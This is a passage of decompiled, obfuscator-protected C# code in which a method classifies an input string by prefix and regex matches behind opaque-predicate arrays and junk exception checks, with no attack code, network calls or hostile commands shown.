								90, -510498584, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							}
						};
						for (; num12 < 5; num12++)
						{
							switch (ortC7CNAc.k50Yftse39kH((int[])array14[num12], 0, 0))
							{
							case 55:
								if (ex4.Message != "SFod3")
								{
									throw ex4;
								}
								break;
							}
						}
					}
					break;
				case 71:
					try
					{
						int k = 0;
						object[] array3 = new object[5]
						{
							new int[6] { 90, -1647132729, 90, 1647132844, 10, 180 },
							new int[12]
							{
								90, -510498573, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[9] { 90, 1611684066, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
							new int[12]
							{
								90, -510498563, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[12]
							{
								90, -510498696, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							}
						};
						for (; k < 5; k++)
						{
							int num2 = ortC7CNAc.k50Yftse39kH((int[])array3[k], 0, 0);
							if (num2 == 45 || num2 != 179)
							{
								continue;
							}
							foreach (string item2 in ienumerable_4)
							{
								int l = 0;
								object[] array4 = new object[5]
								{
									new int[9] { 90, 1611684162, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[9] { 90, 1611684135, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[9] { 90, 1611683967, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[9] { 90, 1611684088, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
									new int[12]
									{
										90, -510498693, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
										10, 180
									}
								};
								for (; l < 5; l++)
								{
									int num3 = ortC7CNAc.k50Yftse39kH((int[])array4[l], 0, 0);
									if (num3 == 48 || num3 != 124)
									{
										continue;
									}
									try
									{
										int m = 0;
										object[] array5 = new object[5]
										{
											new int[12]
											{
												90, -510498618, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[6] { 90, -1647132672, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684022, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611683964, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684118, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
										};
										for (; m < 5; m++)
										{
											switch (ortC7CNAc.k50Yftse39kH((int[])array5[m], 0, 0))
											{
											case 0:
											{
												int n = 0;
												object[] array6 = new object[5]
												{
													new int[12]
													{
														90, -510498652, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[9] { 90, 1611684055, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132773, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132827, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498721, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													}
												};
												for (; n < 5; n++)
												{
													switch (ortC7CNAc.k50Yftse39kH((int[])array6[n], 0, 0))
													{
													case 17:
														if (string_19.StartsWith(item2, StringComparison.OrdinalIgnoreCase))
														{
															return true;
														}
														break;
													}
												}
												break;
											}
											}
										}
									}
									catch (Exception ex)
									{
										int num4 = 0;
										object[] array7 = new object[5]
										{
											new int[12]
											{
												90, -510498595, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[6] { 90, -1647132654, 90, 1647132844, 10, 180 },
											new int[6] { 90, -1647132695, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684140, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684137, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
										};
										for (; num4 < 5; num4++)
										{
											int num5 = ortC7CNAc.k50Yftse39kH((int[])array7[num4], 0, 0);
											if (num5 != 172 && num5 == 176 && ex.Message != "Paosn3")
											{
												throw ex;
											}
										}
									}
								}
							}
						}
					}
					catch (Exception ex2)
					{
						int num6 = 0;
						object[] array8 = new object[5]
						{
							new int[9] { 90, 1611684068, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
							new int[9] { 90, 1611684082, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
							new int[12]
							{
								90, -510498546, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
								10, 180
							},
							new int[6] { 90, -1647132721, 90, 1647132844, 10, 180 },
							new int[6] { 90, -1647132655, 90, 1647132844, 10, 180 }
						};
						for (; num6 < 5; num6++)
						{
							switch (ortC7CNAc.k50Yftse39kH((int[])array8[num6], 0, 0))
							{
							case 123:
								if (ex2.Message != "SFod3")
								{
									throw ex2;
								}
								break;
							}
						}
					}
					break;
				}
			}
		}
		return false;
	}

	private static GEnum1 smethod_6(string string_19)
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[6] { 90, -1295760933, 90, 1295760953, 10, 180 },
			new int[9] { 90, 921913169, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
			new int[6] { 90, -1295760768, 90, 1295760953, 10, 180 },
			new int[12]
			{
				90, -711257520, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
				10, 180
			},
			new int[9] { 90, 921913206, 90, 2077293203, 10, 90, 1295760953, 10, 180 }
		};
		for (; i < 5; i++)
		{
			int num = ortC7CNAc.k50Yftse39kH((int[])array[i], 0, 0);
			if (num == 65 || num != 162)
			{
				continue;
			}
			try
			{
				int j = 0;
				object[] array2 = new object[13]
				{
					new int[9] { 90, 921913357, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
					new int[6] { 90, -1295760592, 90, 1295760953, 10, 180 },
					new int[6] { 90, -1295760798, 90, 1295760953, 10, 180 },
					new int[12]
					{
						90, -711257526, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					},
					new int[9] { 90, 921913524, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
					new int[12]
					{
						90, -711257236, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					},
					new int[12]
					{
						90, -711257211, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					},
					new int[6] { 90, -1295760567, 90, 1295760953, 10, 180 },
					new int[9] { 90, 921913389, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
					new int[12]
					{
						90, -711257258, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					},
					new int[12]
					{
						90, -711257492, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					},
					new int[9] { 90, 921913261, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
					new int[12]
					{
						90, -711257674, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
						10, 180
					}
				};
				for (; j < 13; j++)
				{
					switch (ortC7CNAc.k50Yftse39kH((int[])array2[j], 0, 0))
					{
					case 121:
						try
						{
							int num20 = 0;
							object[] array21 = new object[5]
							{
								new int[9] { 90, 921913264, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
								new int[9] { 90, 921913203, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
								new int[12]
								{
									90, -711257575, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
									10, 180
								},
								new int[9] { 90, 921913249, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
								new int[6] { 90, -1295760909, 90, 1295760953, 10, 180 }
							};
							for (; num20 < 5; num20++)
							{
								int num6 = ortC7CNAc.k50Yftse39kH((int[])array21[num20], 0, 0);
								if (num6 == 43 || num6 != 109)
								{
									continue;
								}
								foreach (Regex item in ienumerable_2)
								{
									int num21 = 0;
									object[] array22 = new object[5]
									{
										new int[9] { 90, 1611684003, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
										new int[6] { 90, -1647132706, 90, 1647132844, 10, 180 },
										new int[12]
										{
											90, -510498629, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
											10, 180
										},
										new int[6] { 90, -1647132786, 90, 1647132844, 10, 180 },
										new int[12]
										{
											90, -510498665, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
											10, 180
										}
									};
									for (; num21 < 5; num21++)
									{
										switch (ortC7CNAc.k50Yftse39kH((int[])array22[num21], 0, 0))
										{
										case 58:
											try
											{
												int num22 = 0;
												object[] array23 = new object[5]
												{
													new int[6] { 90, -1647132699, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498570, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[9] { 90, 1611684029, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498660, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[9] { 90, 1611684023, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
												};
												for (; num22 < 5; num22++)
												{
													int num2 = ortC7CNAc.k50Yftse39kH((int[])array23[num22], 0, 0);
													if (num2 == 58 || num2 != 82)
													{
														continue;
													}
													int num23 = 0;
													object[] array24 = new object[5]
													{
														new int[9] { 90, 1611683968, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[6] { 90, -1647132748, 90, 1647132844, 10, 180 },
														new int[12]
														{
															90, -510498643, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														},
														new int[9] { 90, 1611684105, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[6] { 90, -1647132778, 90, 1647132844, 10, 180 }
													};
													for (; num23 < 5; num23++)
													{
														int num17 = ortC7CNAc.k50Yftse39kH((int[])array24[num23], 0, 0);
														if (num17 != 65 && num17 == 141 && item.IsMatch(string_19))
														{
															return GEnum1.Second;
														}
													}
												}
											}
											catch (Exception ex7)
											{
												int num24 = 0;
												object[] array25 = new object[5]
												{
													new int[9] { 90, 1611684084, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132742, 90, 1647132844, 10, 180 },
													new int[9] { 90, 1611684090, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498699, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[12]
													{
														90, -510498592, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													}
												};
												for (; num24 < 5; num24++)
												{
													switch (ortC7CNAc.k50Yftse39kH((int[])array25[num24], 0, 0))
													{
													case 43:
														if (ex7.Message != "Paosn3")
														{
															throw ex7;
														}
														break;
													}
												}
											}
											break;
										}
									}
								}
							}
						}
						catch (Exception ex8)
						{
							int num25 = 0;
							object[] array26 = new object[5]
							{
								new int[9] { 90, 921913179, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
								new int[6] { 90, -1295760887, 90, 1295760953, 10, 180 },
								new int[6] { 90, -1295760835, 90, 1295760953, 10, 180 },
								new int[9] { 90, 921913147, 90, 2077293203, 10, 90, 1295760953, 10, 180 },
								new int[12]
								{
									90, -711257596, 90, 1633170822, 10, 90, 2077293203, 10, 90, 1295760953,
									10, 180
								}
							};
							for (; num25 < 5; num25++)
							{
								switch (ortC7CNAc.k50Yftse39kH((int[])array26[num25], 0, 0))
								{
								case 7:
									if (ex8.Message != "SFod3")
									{
										throw ex8;
									}
									break;
								}
							}
						}
						break;
					case 446:
						try
						{
							int num12 = 0;
							object[] array15 = new object[5]
							{
								new int[6] { 90, -1647132729, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498551, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[12]
								{
									90, -510498604, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[6] { 90, -1647132798, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498646, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								}
							};
							for (; num12 < 5; num12++)
							{
								switch (ortC7CNAc.k50Yftse39kH((int[])array15[num12], 0, 0))
								{
								case 46:
									foreach (string item2 in ienumerable_6)
									{
										int num13 = 0;
										object[] array16 = new object[5]
										{
											new int[6] { 90, -1647132779, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684071, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[12]
											{
												90, -510498735, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
												10, 180
											},
											new int[6] { 90, -1647132672, 90, 1647132844, 10, 180 },
											new int[6] { 90, -1647132835, 90, 1647132844, 10, 180 }
										};
										for (; num13 < 5; num13++)
										{
											int num14 = ortC7CNAc.k50Yftse39kH((int[])array16[num13], 0, 0);
											if (num14 == 8 || num14 != 172)
											{
												continue;
											}
											try
											{
												int num15 = 0;
												object[] array17 = new object[5]
												{
													new int[12]
													{
														90, -510498557, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[12]
													{
														90, -510498714, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[6] { 90, -1647132804, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132836, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498562, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													}
												};
												for (; num15 < 5; num15++)
												{
													switch (ortC7CNAc.k50Yftse39kH((int[])array17[num15], 0, 0))
													{
													case 8:
													{
														int num16 = 0;
														object[] array18 = new object[5]
														{
															new int[6] { 90, -1647132776, 90, 1647132844, 10, 180 },
															new int[6] { 90, -1647132834, 90, 1647132844, 10, 180 },
															new int[6] { 90, -1647132684, 90, 1647132844, 10, 180 },
															new int[6] { 90, -1647132707, 90, 1647132844, 10, 180 },
															new int[6] { 90, -1647132789, 90, 1647132844, 10, 180 }
														};
														for (; num16 < 5; num16++)
														{
															int num17 = ortC7CNAc.k50Yftse39kH((int[])array18[num16], 0, 0);
															if (num17 != 54 && num17 == 137 && string_19.StartsWith(item2, StringComparison.OrdinalIgnoreCase))
															{
																return GEnum1.Second;
															}
														}
														break;
													}
													}
												}
											}
											catch (Exception ex5)
											{
												int num18 = 0;
												object[] array19 = new object[5]
												{
													new int[12]
													{
														90, -510498700, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[6] { 90, -1647132722, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132780, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132732, 90, 1647132844, 10, 180 },
													new int[9] { 90, 1611684041, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
												};
												for (; num18 < 5; num18++)
												{
													int num2 = ortC7CNAc.k50Yftse39kH((int[])array19[num18], 0, 0);
													if (num2 != 76 && num2 == 112 && ex5.Message != "Paosn3")
													{
														throw ex5;
													}
												}
											}
										}
									}
									break;
								}
							}
						}
						catch (Exception ex6)
						{
							int num19 = 0;
							object[] array20 = new object[5]
							{
								new int[9] { 90, 1611684058, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[6] { 90, -1647132833, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498710, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[6] { 90, -1647132655, 90, 1647132844, 10, 180 },
								new int[9] { 90, 1611684155, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
							};
							for (; num19 < 5; num19++)
							{
								switch (ortC7CNAc.k50Yftse39kH((int[])array20[num19], 0, 0))
								{
								case 189:
									if (ex6.Message != "SFod3")
									{
										throw ex6;
									}
									break;
								}
							}
						}
						break;
					case 424:
						try
						{
							int num5 = 0;
							object[] array9 = new object[5]
							{
								new int[12]
								{
									90, -510498690, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[6] { 90, -1647132707, 90, 1647132844, 10, 180 },
								new int[9] { 90, 1611684035, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[9] { 90, 1611684083, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498729, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								}
							};
							for (; num5 < 5; num5++)
							{
								int num6 = ortC7CNAc.k50Yftse39kH((int[])array9[num5], 0, 0);
								if (num6 == 12 || num6 != 119)
								{
									continue;
								}
								foreach (string item3 in ienumerable_7)
								{
									int num7 = 0;
									object[] array10 = new object[5]
									{
										new int[12]
										{
											90, -510498572, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
											10, 180
										},
										new int[6] { 90, -1647132717, 90, 1647132844, 10, 180 },
										new int[9] { 90, 1611684044, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
										new int[6] { 90, -1647132771, 90, 1647132844, 10, 180 },
										new int[6] { 90, -1647132764, 90, 1647132844, 10, 180 }
									};
									for (; num7 < 5; num7++)
									{
										switch (ortC7CNAc.k50Yftse39kH((int[])array10[num7], 0, 0))
										{
										case 73:
											try
											{
												int num8 = 0;
												object[] array11 = new object[5]
												{
													new int[12]
													{
														90, -510498697, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[12]
													{
														90, -510498578, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													},
													new int[9] { 90, 1611684081, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132791, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132817, 90, 1647132844, 10, 180 }
												};
												for (; num8 < 5; num8++)
												{
													int num2 = ortC7CNAc.k50Yftse39kH((int[])array11[num8], 0, 0);
													if (num2 == 26 || num2 != 53)
													{
														continue;
													}
													int num9 = 0;
													object[] array12 = new object[5]
													{
														new int[9] { 90, 1611684030, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[12]
														{
															90, -510498594, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														},
														new int[9] { 90, 1611684111, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[6] { 90, -1647132844, 90, 1647132844, 10, 180 },
														new int[9] { 90, 1611684075, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
													};
													for (; num9 < 5; num9++)
													{
														switch (ortC7CNAc.k50Yftse39kH((int[])array12[num9], 0, 0))
														{
														case 0:
															if (string_19.StartsWith(item3, StringComparison.OrdinalIgnoreCase))
															{
																return GEnum1.Third;
															}
															break;
														}
													}
												}
											}
											catch (Exception ex3)
											{
												int num10 = 0;
												object[] array13 = new object[5]
												{
													new int[6] { 90, -1647132736, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132715, 90, 1647132844, 10, 180 },
													new int[6] { 90, -1647132720, 90, 1647132844, 10, 180 },
													new int[9] { 90, 1611684051, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
													new int[12]
													{
														90, -510498690, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
														10, 180
													}
												};
												for (; num10 < 5; num10++)
												{
													int num2 = ortC7CNAc.k50Yftse39kH((int[])array13[num10], 0, 0);
													if (num2 != 51 && num2 == 87 && ex3.Message != "Paosn3")
													{
														throw ex3;
													}
												}
											}
											break;
										}
									}
								}
							}
						}
						catch (Exception ex4)
						{
							int num11 = 0;
							object[] array14 = new object[5]
							{
								new int[12]
								{
									90, -510498695, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[9] { 90, 1611684162, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[6] { 90, -1647132817, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498706, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[12]
								{
									90, -510498732, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								}
							};
							for (; num11 < 5; num11++)
							{
								int num6 = ortC7CNAc.k50Yftse39kH((int[])array14[num11], 0, 0);
								if (num6 != 9 && num6 == 36 && ex4.Message != "SFod3")
								{
									throw ex4;
								}
							}
						}
						break;
					case 217:
						try
						{
							int k = 0;
							object[] array3 = new object[5]
							{
								new int[9] { 90, 1611684061, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[9] { 90, 1611684067, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
								new int[6] { 90, -1647132844, 90, 1647132844, 10, 180 },
								new int[6] { 90, -1647132748, 90, 1647132844, 10, 180 },
								new int[9] { 90, 1611684079, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
							};
							for (; k < 5; k++)
							{
								switch (ortC7CNAc.k50Yftse39kH((int[])array3[k], 0, 0))
								{
								case 96:
									foreach (string item4 in ienumerable_5)
									{
										int l = 0;
										object[] array4 = new object[5]
										{
											new int[9] { 90, 1611684094, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[6] { 90, -1647132750, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684014, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611683973, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
											new int[9] { 90, 1611684073, 90, 1036150488, 10, 90, 1647132844, 10, 180 }
										};
										for (; l < 5; l++)
										{
											switch (ortC7CNAc.k50Yftse39kH((int[])array4[l], 0, 0))
											{
											case 9:
												try
												{
													int m = 0;
													object[] array5 = new object[5]
													{
														new int[12]
														{
															90, -510498649, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														},
														new int[12]
														{
															90, -510498672, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														},
														new int[12]
														{
															90, -510498548, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														},
														new int[6] { 90, -1647132746, 90, 1647132844, 10, 180 },
														new int[12]
														{
															90, -510498678, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														}
													};
													for (; m < 5; m++)
													{
														int num2 = ortC7CNAc.k50Yftse39kH((int[])array5[m], 0, 0);
														if (num2 == 63 || num2 != 98)
														{
															continue;
														}
														int n = 0;
														object[] array6 = new object[5]
														{
															new int[6] { 90, -1647132738, 90, 1647132844, 10, 180 },
															new int[6] { 90, -1647132840, 90, 1647132844, 10, 180 },
															new int[9] { 90, 1611684123, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
															new int[9] { 90, 1611683996, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
															new int[12]
															{
																90, -510498586, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
																10, 180
															}
														};
														for (; n < 5; n++)
														{
															switch (ortC7CNAc.k50Yftse39kH((int[])array6[n], 0, 0))
															{
															case 32:
																if (string_19.StartsWith(item4, StringComparison.OrdinalIgnoreCase))
																{
																	return GEnum1.First;
																}
																break;
															}
														}
													}
												}
												catch (Exception ex)
												{
													int num3 = 0;
													object[] array7 = new object[5]
													{
														new int[6] { 90, -1647132828, 90, 1647132844, 10, 180 },
														new int[9] { 90, 1611684138, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[9] { 90, 1611684128, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[9] { 90, 1611683988, 90, 1036150488, 10, 90, 1647132844, 10, 180 },
														new int[12]
														{
															90, -510498698, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
															10, 180
														}
													};
													for (; num3 < 5; num3++)
													{
														switch (ortC7CNAc.k50Yftse39kH((int[])array7[num3], 0, 0))
														{
														case 24:
															if (ex.Message != "Paosn3")
															{
																throw ex;
															}
															break;
														}
													}
												}
												break;
											}
										}
									}
									break;
								}
							}
						}
						catch (Exception ex2)
						{
							int num4 = 0;
							object[] array8 = new object[5]
							{
								new int[12]
								{
									90, -510498597, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[6] { 90, -1647132744, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498739, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								},
								new int[6] { 90, -1647132746, 90, 1647132844, 10, 180 },
								new int[12]
								{
									90, -510498639, 90, 2122182706, 10, 90, 1036150488, 10, 90, 1647132844,
									10, 180
								}
							};
							for (; num4 < 5; num4++)
							{
								switch (ortC7CNAc.k50Yftse39kH((int[])array8[num4], 0, 0))
								{
								case 98:
									if (ex2.Message != "SFod3")
									{
										throw ex2;
									}
									break;
								}
							}
						}
						break;
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return GEnum1.Safe;
	}
}
